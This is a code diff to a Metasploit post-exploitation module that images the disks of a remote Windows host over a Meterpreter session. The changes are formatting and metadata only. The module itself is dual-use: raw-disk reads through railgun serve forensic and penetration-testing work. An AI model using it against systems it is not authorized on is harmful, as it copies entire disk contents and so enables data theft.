@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         'Name' => 'Windows Gather Forensic Imaging',
-        'Description' => %q{This module will perform byte-for-byte imaging of remote disks and volumes},
+        'Description' => %q{This module will perform byte-for-byte imaging of remote disks and volumes.},
         'License' => MSF_LICENSE,
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
@@ -32,6 +32,11 @@ class MetasploitModule < Msf::Post
               stdapi_railgun_api
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -60,8 +65,15 @@ class MetasploitModule < Msf::Post
     fsctl_allow_extended_dasd_io = 0x00090083
     ioctl_disk_get_drive_geometry_ex = 0x000700A0
 
-    r = client.railgun.kernel32.CreateFileA(devname, 'GENERIC_READ',
-                                            0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)
+    r = client.railgun.kernel32.CreateFileA(
+      devname,
+      'GENERIC_READ',
+      0x3,
+      nil,
+      'OPEN_EXISTING',
+      'FILE_ATTRIBUTE_READONLY',
+      0
+    )
     handle = r['return']
 
     if handle == invalid_handle_value
@@ -71,11 +83,21 @@ class MetasploitModule < Msf::Post
 
     r = client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)
 
-    ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                    '', 0, 200, 200, 4, '')
+    ioctl = client.railgun.kernel32.DeviceIoControl(
+      handle,
+      ioctl_disk_get_drive_geometry_ex,
+      '',
+      0,
+      200,
+      200,
+      4,
+      ''
+    )
     if ioctl['GetLastError'] == 6
-      ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                      '', 0, 200, 200, 4, '')
+      ioctl = client.railgun.kernel32.DeviceIoControl(
+        handle, ioctl_disk_get_drive_geometry_ex,
+        '', 0, 200, 200, 4, ''
+      )
     end
     geometry = ioctl['lpOutBuffer']
 
@@ -89,8 +111,9 @@ class MetasploitModule < Msf::Post
     file_number = 1
     file_data_count = 0
     disk_bytes_count = 0
-    fp = ::File.new('%s.%03i' % [base_filename, file_number], 'w')
-    print_line("Started imaging #{devname} to %s.%03i" % [base_filename, file_number])
+    fname = base_filename.to_s + format('.%<file_number>03i', file_number: file_number)
+    fp = ::File.new(fname, 'w')
+    print_line("Started imaging #{devname} to #{fname}")
 
     md5_hash = Digest::MD5.new
     sha1_hash = Digest::SHA1.new
@@ -138,8 +161,9 @@ class MetasploitModule < Msf::Post
 
       file_number += 1
       file_data_count = 0
-      fp = ::File.new('%s.%03i' % [base_filename, file_number], 'w')
-      print_line('...continuing with %s.%03i' % [base_filename, file_number])
+      fname = base_filename.to_s + format('.%<file_number>03i', file_number: file_number)
+      fp = ::File.new(fname, 'w')
+      print_line("...continuing with #{fname}")
     end
     fp.close
 
